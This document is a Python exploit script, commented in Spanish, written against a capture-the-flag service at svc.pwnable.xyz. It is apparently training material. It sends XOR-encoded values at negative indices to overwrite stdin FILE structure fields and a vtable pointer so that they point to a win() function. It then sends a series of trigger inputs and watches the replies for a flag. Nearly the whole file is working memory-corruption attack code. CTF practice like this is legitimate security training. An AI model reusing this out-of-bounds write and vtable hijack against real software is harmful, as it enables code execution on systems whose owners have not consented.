#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

print("Conectando...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win = 0xa21
result_base = 0x202200

print("\n=== Estrategia Final: Sobrescribir TODOS los campos alcanzables ===")
print("Voy a poner win() en TODAS las posiciones y ver si alguna se ejecuta\n")

# Primero llenar result[1-9] con win
print("Llenando result[1-9] con win...")
for i in range(1, 10):
    b = i * 97
    a = win ^ b
    s.sendall(f"{a} {b} {i}\n".encode())
    time.sleep(0.05)

print("OK")

# Ahora sobrescribir stdin fields con diferentes valores útiles
print("\nSobrescribiendo campos de stdin...")

# stdin+184 a stdin+216 con win
for offset in [-9, -8, -7, -6, -5]:
    b = abs(offset) * 0x333
    a = win ^ b
    print(f"  offset {offset} = win")
    s.sendall(f"{a} {b} {offset}\n".encode())
    time.sleep(0.05)

# Vtable pointer apuntando a result[]
print(f"  offset -4 (vtable) = result base")
b = 0x9999999999999999
a = result_base ^ b
s.sendall(f"{a} {b} -4\n".encode())
time.sleep(0.1)

print("\nPoblación completa. Ahora triggerando...")

# Probar MUCHOS triggers diferentes
triggers = [
    ("Normal", "100 200 5\n"),
    ("XOR a 0", "10 10 3\n"),
    ("Valores grandes", "999999999 888888888 7\n"),
    ("Negativos", "-5 -10 2\n"),
    ("Salida por a=0", "0 1 1\n"),
    ("Salida por b=0", "1 0 1\n"),
    ("Salida por c>9", "1 1 10\n"),
    ("Input inválido", "ABC\n"),
    ("Dos valores", "1 2\n"),
    ("Un valor", "42\n"),
    ("Vacío", "\n"),
]

s.settimeout(3)

for desc, payload in triggers:
    print(f"\n{desc}: {repr(payload.strip())}")
    try:
        s.sendall(payload.encode())
        time.sleep(0.5)
        
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
        except:
            pass
        
        if data:
            decoded = data.decode()
            print(f"  -> {decoded[:200]}")
            if "flag" in decoded.lower() or "FLAG{" in decoded or "pwn" in decoded:
                print("\n" + "="*60)
                print("¡FLAG ENCONTRADA!")
                print(decoded)
                print("="*60)
                break
    except BrokenPipeError:
        print("  -> Broken pipe")
        break
    except Exception as e:
        print(f"  -> {e}")

s.close()
print("\nCerrando")